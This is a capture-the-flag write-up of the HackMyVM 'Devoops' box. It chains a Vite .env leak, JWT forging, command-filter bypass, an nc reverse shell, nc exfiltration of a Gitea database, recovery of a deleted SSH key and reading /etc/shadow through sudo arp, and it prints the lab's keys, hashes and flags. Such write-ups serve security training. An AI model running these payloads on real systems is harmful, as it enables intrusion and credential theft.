# Devoops

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.43:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.43

PORT     STATE SERVICE REASON  VERSION
3000/tcp open  ppp?    syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 403 Forbidden
|     Vary: Origin
|     Content-Type: text/plain
|     Date: Thu, 04 Sep 2025 15:56:06 GMT
|     Connection: close
|     Blocked request. This host (undefined) is not allowed.
|     allow this host, add undefined to `server.allowedHosts` in vite.config.js.
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     Vary: Origin, Access-Control-Request-Headers
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Content-Length: 0
|     Date: Thu, 04 Sep 2025 15:56:06 GMT
|_    Connection: close
```
:::

## HTTP (3000)

![writeup.png](/assets/pentest/hackmyvm/devoops/writeup.png)

### Fuzzing

```bash
â””â”€$ feroxbuster -u http://10.0.2.43:3000/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,403,500 --dont-scan js,css,png,jpeg,jpg,gif -n -W 33
200      GET        1l        1w      189c http://10.0.2.43:3000/sign
200      GET      130l      348w    21764c http://10.0.2.43:3000/server
401      GET        1l        2w       48c http://10.0.2.43:3000/execute
```

`/sign` returns a signed JWT token for **guest** user
```bash
â””â”€$ curl http://10.0.2.43:3000/sign
{"status":"signed","data":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NTcwMDE2MDQsImV4cCI6MTc1NzAwMzQwNH0.v1NxIB8BvHz8r6nPVbaWNlToAiuIM9xB7oma4-SP-yw"}                     
```

![writeup-1.png](/assets/pentest/hackmyvm/devoops/writeup-1.png)

### Source Code

The `/execute` endpoint allows us to execute commands, however we must pass JWT token with `role=admin`
```js
â””â”€$ curl http://10.0.2.43:3000/server -s | grep -v sourceMappingURL
import __vite__cjsImport0_express from "/node_modules/.vite/deps/express.js?v=8bc9628c"; const express = __vite__cjsImport0_express.__esModule ? __vite__cjsImport0_express.default : __vite__cjsImport0_express;
import __vite__cjsImport1_jsonwebtoken from "/node_modules/.vite/deps/jsonwebtoken.js?v=8bc9628c"; const jwt = __vite__cjsImport1_jsonwebtoken.__esModule ? __vite__cjsImport1_jsonwebtoken.default : __vite__cjsImport1_jsonwebtoken;
import "/node_modules/.vite/deps/dotenv_config.js?v=8bc9628c"
import __vite__cjsImport3_child_process from "/@id/__vite-browser-external:child_process"; const exec = __vite__cjsImport3_child_process["exec"];
import __vite__cjsImport4_util from "/@id/__vite-browser-external:util"; const promisify = __vite__cjsImport4_util["promisify"];

const app = express();

const address = 'localhost';
const port = 3001;

const exec_promise = promisify(exec);

const COMMAND_FILTER = process.env.COMMAND_FILTER
    ? process.env.COMMAND_FILTER.split(',')
        .map(cmd => cmd.trim().toLowerCase())
        .filter(cmd => cmd !== '')
    : [];

app.use(express.json());

function is_safe_command(cmd) {
    if (!cmd || typeof cmd !== 'string') { return false; }
    if (COMMAND_FILTER.length === 0) { return false; }

    const lower_cmd = cmd.toLowerCase();

    for (const forbidden of COMMAND_FILTER) {
        const regex = new RegExp(`\\b${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b|^${forbidden.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'i');
        if (regex.test(lower_cmd)) {
            return false;
        }
    }

    if (/[;&|]/.test(cmd)) { return false; }
    if (/[<>]/.test(cmd)) { return false; }
    if (/[`$()]/.test(cmd)) { return false; }

    return true;
}

async function execute_command_sync(command) {
    try {
        const { stdout, stderr } = await exec_promise(command);

        if (stderr) {
            return { status: false, data: { stdout, stderr } };
        }
        return { status: true, data: { stdout, stderr } };
    } catch (error) {
        return { status: true, data: error.message };
    }
}

app.get('/', (req, res) => { return res.json({ 'status': 'working', 'data': `listening on http://${address}:${port}` }); })

app.get('/api/sign', (req, res) => {
    return res.json({
        'status': 'signed',
        'data': jwt.sign({ uid: -1, role: 'guest' }, 
        process.env.JWT_SECRET, { expiresIn: '1800s' }),
    });
});

app.get('/api/execute', async (req, res) => {
    const authorization_header_raw = req.headers['authorization'];
    if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {
        return res.status(401).json({ 'status': 'rejected', 'data': 'permission denied' });
    }

    const jwt_raw = authorization_header_raw.split(' ')[1];

    try {
        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
        if (payload.role !== 'admin') {
            return res.status(403).json({ 'status': 'rejected', 'data': 'permission denied' });
        }
    } catch (err) {
        return res.status(401).json({ 'status': 'rejected', 'data': `permission denied` });
    }

    const command = req.query.cmd;

    const is_command_safe = is_safe_command(command);
    if (!is_command_safe) {
        return res.status(401).json({ 'status': 'rejected', 'data': `this command is unsafe` });
    }

    const result = await execute_command_sync(command);

    return res.json({ 'status': result.status === true ? 'executed' : 'failed', 'data': result.data })
});

app.listen(port, address, () => { console.log(`Listening on http://${address}:${port}`) });
```

To sign the JWT token correctly we have to either brute-force the Secret value or somehow leak `.env`
```bash
â””â”€$ curl http://10.0.2.43:3000/.env -s | html2markdown
# 403 Restricted

The request url "/opt/node/.env" is outside of Vite serving allow list.

\- /opt/node

Refer to docs https://vite.dev/config/server-options.html#server-fs-allow for
configurations and more details.

â””â”€$ curl http://10.0.2.43:3000/vite.config.js
import { defineConfig } from "/node_modules/.vite/deps/vite.js?v=53811639"
import vue from "/node_modules/.vite/deps/@vitejs_plugin-vue.js?v=22310e9f"

// https://vite.dev/config/
export default defineConfig({
  plugins: [vue()],
  server: {
    proxy: {
      '/sign': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/sign/, '/api/sign')
      },
      '/execute': {
        target: 'http://localhost:3001',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/execute/, '/api/execute')
      }
    },
    fs: {
      deny: ['.env', '.env.*', '*.{crt,pem}', '**/.git/**', 'package.json'],
    }
  },
})
```

### Leak `.env`

- [Vite allows server.fs.deny to be bypassed with .svg or relative paths](https://github.com/advisories/GHSA-xcj6-pq6g-qj4x)
- [CVE-2025-30208-31125-31486-32395](https://github.com/nkuty/CVE-2025-30208-31125-31486-32395)

Use of of the payloads:
```bash
â””â”€$ curl 'http://10.0.2.43:3000/.env?raw??' -s | grep -v sourceMappingURL
export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'\n"
```

### JWT Sign

Update JWT

![writeup-2.png](/assets/pentest/hackmyvm/devoops/writeup-2.png)

::: info Note
Above JWT expired, if it does request new one on `/sign`, forge and send.
:::

### RCE

We are limited to what commands we can execute and we need to bypass it.
```bash
â””â”€$ curl 'http://10.0.2.43:3000/execute' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1NzAwMzQ4OCwiZXhwIjoxNzU3MDA1Mjg4fQ.lduA5JzE0wyp4ieMlc_Rq34wkS3_GNSrFxobOTKjSbs' -G --data-urlencode 'cmd=/usr/bin/id' -s | jq -r .data
{
  "stdout": "uid=1000(runner) gid=1000(runner) groups=1000(runner)\n",
  "stderr": ""
}
```

Using bash magic we can bypass the filenames. `/bin/l[123]` translates to `/bin/l1, /bin/l2, /bin/l3`, so `/bin/l[s]` is just `/bin/ls`.
```bash
â””â”€$ curl 'http://10.0.2.43:3000/execute' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1NzAwMzQ4OCwiZXhwIjoxNzU3MDA1Mjg4fQ.lduA5JzE0wyp4ieMlc_Rq34wkS3_GNSrFxobOTKjSbs' -G --data-urlencode 'cmd=/bin/l[s] /tmp' -s | jq -r .data
{
  "stdout": "node-compile-cache\n",
  "stderr": ""
}
```

## Reverse Shell (runner)

::: info Note
`/bin/bash` doesn't exist ðŸ˜³
:::

```bash
â””â”€$ curl 'http://10.0.2.43:3000/execute' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc1NzAwMzQ4OCwiZXhwIjoxNzU3MDA1Mjg4fQ.lduA5JzE0wyp4ieMlc_Rq34wkS3_GNSrFxobOTKjSbs' -G --data-urlencode 'cmd=/usr/bin/n[c] 10.0.2.15 4444 -e /bin/s[h]' -s | jq -r .data
```

Couldn't spawn TTY, so `>` just indicates what Im executing. Alongside `nodejs` application there's `Gitea` and we can read database.

```bash
â””â”€$ listen
Ncat: Connection from 10.0.2.43:45199.
> id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
> find . -type f | grep -v node
./log/gitea.log
./db/gitea.db
> pwd
/opt/gitea
> find . -type f | grep -v node
./log/gitea.log
./db/gitea.db
```

Download
```bash
â””â”€$ nc -lvnp 4444 > gitea.db
---
> nc 10.0.2.15 4444 < /opt/gitea/db/gitea.db
---
â””â”€$ file gitea.db
gitea.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 516, database pages 506, cookie 0x1d9, schema 4, UTF-8, version-valid-for 516
```

Extract hashes and recover
```bash
â””â”€$ sqlite3 gitea.db "SELECT REPLACE(name || ':' || 'sha256:50000:' || BASE64(UNHEX(salt)) || ':' || BASE64(UNHEX(passwd)),CHAR(10),'') FROM user"
hana:sha256:50000:CR9wfTamlqtt3/V345Z6gg==:45t9ek4a98u3DA05eZZs3MvGKE3E2irgb3nPqpY46LB8GW45O5sad+FcrNGLdIOpnzQ=

âžœ .\hashcat.exe -a 0 -m 10900 C:\Users\Public\hashes.txt C:\Users\Public\rockyou.txt --user # -D 1
[From future]: Took too f-ing long, canceled. Probably not recoverable.
```

While waiting for this check repositories
```bash
> cd
/opt/gitea/git/hana/node.git
> git status 2>&1
fatal: detected dubious ownership in repository at '/opt/gitea/git/hana/node.git'
To add an exception for this directory, call:

        git config --global --add safe.directory /opt/gitea/git/hana/node.git

> git config --global --add safe.directory /opt/gitea/git/hana/node.git 2>&1
error: could not lock config file /.gitconfig: Permission denied

> cd /tmp
> cp /opt/gitea/git/hana/node.git . -r
> cd node.git
> git log -p 2>&1
commit 1994a70bbd080c633ac85a339fd85a8635c63893
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:36:12 2025 +0800

    del: oops!

diff --git a/id_ed25519 b/id_ed25519
deleted file mode 100644
index a2626a4..0000000
--- a/id_ed25519
+++ /dev/null
@@ -1,7 +0,0 @@
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
-5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
-AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
-WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
------END OPENSSH PRIVATE KEY-----

commit 02c0f912f6e5b09616580d960f3e5ee33b06084a
Author: azwhikaru <37921907+azwhikaru@users.noreply.github.com>
Date:   Mon Apr 21 14:34:37 2025 +0800

    init: init commit

diff --git a/.env b/.env
new file mode 100644
index 0000000..a154aae
--- /dev/null
+++ b/.env
@@ -0,0 +1,2 @@
```

## SSH (Internal)

```bash
> git log -p | grep '+-----BEGIN OPENSSH PRIVATE KEY-----' -A6 | sed 's/^.//g' | tee /tmp/id_rsa.hana
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrgAAAJgA8k3lAPJN
5QAAAAtzc2gtZWQyNTUxOQAAACCMB5xEc6A2I69whyZDcTSPGVsz2jivuziHAEXaAlJLrg
AAAEBX7jUWSgQUQgA8z8yL85Eg1WiSgijSu3C4x8TVF/G3uIwHnERzoDYjr3CHJkNxNI8Z
WzPaOK+7OIcARdoCUkuuAAAAEGhhbmFAZGV2b29wcy5obXYBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
> chmod 600 /tmp/id_rsa.hana
> ssh -i /tmp/id_rsa.hana hana@0 2>&1
Pseudo-terminal will not be allocated because stdin is not a terminal.
Host key verification failed.
```


```bash
> ssh -i /tmp/id_rsa.hana -tt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null hana@0 2>&1
Warning: Permanently added '0.0.0.0' (ED25519) to the list of known hosts.

devoops:~$ id
uid=1001(hana) gid=100(users) groups=100(users),100(users)
```

### User.txt

```bash
devoops:~$ cat user.flag
flag{03d0e150ae9fc686a827b41e1969d497}
```

## Privilege Escalation

```bash
devoops:~$ /bin/sh -i # Get TTY
devoops:~$ sudo -l
Matching Defaults entries for hana on devoops:

    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for hana:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User hana may run the following commands on devoops:
    (root) NOPASSWD: /sbin/arp
```

[https://gtfobins.github.io/gtfobins/arp/#sudo](https://gtfobins.github.io/gtfobins/arp/#sudo)

Hmmm we can read files with `arp`, but that's it. `env_keep` is suspicious tho... 

Not useful. When using `sudo visudo`, the environment variables `SUDO_EDITOR`, `EDITOR`, and `VISUAL` are kept.

```bash
sudo arp -v -f /etc/shadow 2>&1 | grep root
>> root:$6$FGoCakO3/TPFyfOf$6eojvYb2zPpVHYs2eYkMKETlkkilK/6/pfug1.6soWhv.V5Z7TYNDj9hwMpTK8FlleMOnjdLv6m/e94qzE7XV.:20200:0:::::
```

```powershell
âžœ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
eris             (root)
```

```bash
devoops:~# ls -lAh
total 8K
lrwxrwxrwx    1 root     root           9 Apr 21 10:31 .ash_history -> /dev/null
-r--------    1 root     root         516 Apr 22 09:22 N073.7X7
-r--------    1 root     root          39 Apr 21 14:48 R007.7x7oOoOoOoOoOoO
devoops:~# cat N073.7X7
ssh://runner:Bo6xQ8Vrjm7rV1tii2gfRVW6T59jgGF7novHfQrkU3tzKmzVFxE7278L5raa2x9qCihrTrD6v0fu1m61ZkxJB5Gw@devoops.hmv
ssh://hana:UYi5Moj0BQw0QrGahe7i2Bs6VcyUcQMvmqDPs8aPdy8rJqBrcgPm33hbzBbY8j0og3aHN5bqAbKpze97BCLvuhgL@devoops.hmv
ssh://root:eris@devoops.hmv

gitea://hana:saki

jwt secret:
y0u_n3v3r_kn0w_1t -> BASE58 -> 2942szKG7Ev83aDviugAa6rF

user flag:
devoooooooops! -> MD5 -> flag{03d0e150ae9fc686a827b41e1969d497}

root flag:
Debug the world -> d36u9_th3_w0r1d! -> MD5 -> flag{a834296543f4c2990909ce1c56becfba}
```

### Root.txt

```
devoops:~# cat R007.7x7oOoOoOoOoOoO
flag{a834296543f4c2990909ce1c56becfba}
```